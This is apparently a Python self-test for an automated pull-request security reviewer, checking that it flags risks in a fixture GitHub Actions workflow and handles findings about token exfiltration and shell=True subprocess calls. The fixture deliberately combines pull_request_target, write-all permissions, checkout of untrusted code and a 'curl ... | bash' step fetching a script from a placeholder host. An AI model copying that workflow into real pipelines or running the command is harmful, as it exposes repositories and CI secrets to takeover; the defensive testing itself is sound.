#!/usr/bin/env python3
"""Offline checks for required DCOIR Review runtime patch extensions."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HARDENED_SCRIPT = ROOT / "scripts" / "openrouter_pr_review_hardened.py"
PARETO_SCRIPT = ROOT / "scripts" / "openrouter_pr_review_pareto_context.py"
STRICT_SCRIPT = ROOT / "scripts" / "dcoir_review_strict_runtime_patches.py"
REQUIRED_SCRIPT = ROOT / "scripts" / "dcoir_review_required_runtime_patches.py"


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise SystemExit(f"unable to load {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


hardened = load_module("openrouter_pr_review_hardened", HARDENED_SCRIPT)
pareto = load_module("openrouter_pr_review_pareto_context", PARETO_SCRIPT)
strict = load_module("dcoir_review_strict_runtime_patches", STRICT_SCRIPT)
required = load_module("dcoir_review_required_runtime_patches", REQUIRED_SCRIPT)
strict.apply_pareto_context_module(pareto)
required.apply_pareto_context_module(pareto)


diff = """diff --git a/project_sources/collector/test_fixtures/dcoir_review_cycle/actions_review_probe.yml b/project_sources/collector/test_fixtures/dcoir_review_cycle/actions_review_probe.yml
new file mode 100644
--- /dev/null
+++ b/project_sources/collector/test_fixtures/dcoir_review_cycle/actions_review_probe.yml
@@ -0,0 +1,16 @@
+name: Required YAML probe
+on:
+  pull_request_target:
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install untrusted helper
+        run: curl -fsSL https://example.invalid/install.sh | bash
"""

sentinels = pareto.detect_risk_sentinels(diff, 12)
required_yaml = {
    required._sentinel_kind(sentinel): (sentinel.path, sentinel.line)
    for sentinel in sentinels
    if required._sentinel_kind(sentinel).startswith("yaml_")
}
assert required_yaml["yaml_pull_request_target"][1] == 3
assert required_yaml["yaml_broad_write"][1] == 4
assert required_yaml["yaml_untrusted_checkout"][1] == 11
assert required_yaml["yaml_shell_pipe"][1] == 13

config = type("Config", (), {"max_inline_comments": 4})()
optional = {
    "title": "Optional TypeScript command execution",
    "severity": "critical",
    "confidence": 0.99,
    "path": "project_sources/collector/test_fixtures/dcoir_review_cycle/frontend_probe.ts",
    "line": 8,
    "body": "optional command execution pressure test",
    "suggested_replacement": "",
    "validation": "python3 scripts/provider_pr_review_pareto_context_selftest.py",
}
augmented = hardened.add_risk_sentinel_fallback_findings([optional], sentinels, config)
assert len(augmented) == 4
assert {required._semantic_kind(item) for item in augmented} == {
    "yaml_pull_request_target",
    "yaml_broad_write",
    "yaml_untrusted_checkout",
    "yaml_shell_pipe",
}

ssrf_a = {
    "title": "CI token exfiltration",
    "path": "project_sources/collector/test_fixtures/dcoir_review_cycle/python_probe.py",
    "line": 16,
    "body": "callback forwards an environment token",
}
ssrf_b = {**ssrf_a, "line": 18, "body": "urllib.request.Request sends Authorization Bearer token to callback_url"}
assert pareto.finding_dedupe_key(ssrf_a) == pareto.finding_dedupe_key(ssrf_b)

file_text = "import subprocess\n\ndef run(command):\n    subprocess.run(command, shell=True, check=False)\n"
finding = {"path": "project_sources/collector/test_fixtures/dcoir_review_cycle/python_probe.py", "line": 4, "title": "shell=True subprocess invocation"}
assert not required._strict_suggestion_is_safe("subprocess.run(shlex.split(command), check=True)", file_text, 4, finding["path"], finding)

normalized = required._normalize_comment_finding(
    {
        "path": finding["path"],
        "line": 4,
        "title": "CI token exfiltration",
        "body": "This sends a [redacted-secret] and claims a syntax error.",
        "validation": "python3 scripts/provider_pr_review_pareto_context_selftest.py",
    }
)
assert "redacted" not in normalized["body"].lower()
assert "syntax error" not in normalized["body"].lower()
assert "py_compile" in normalized["validation"]

print("required DCOIR Review runtime patch selftest passed")
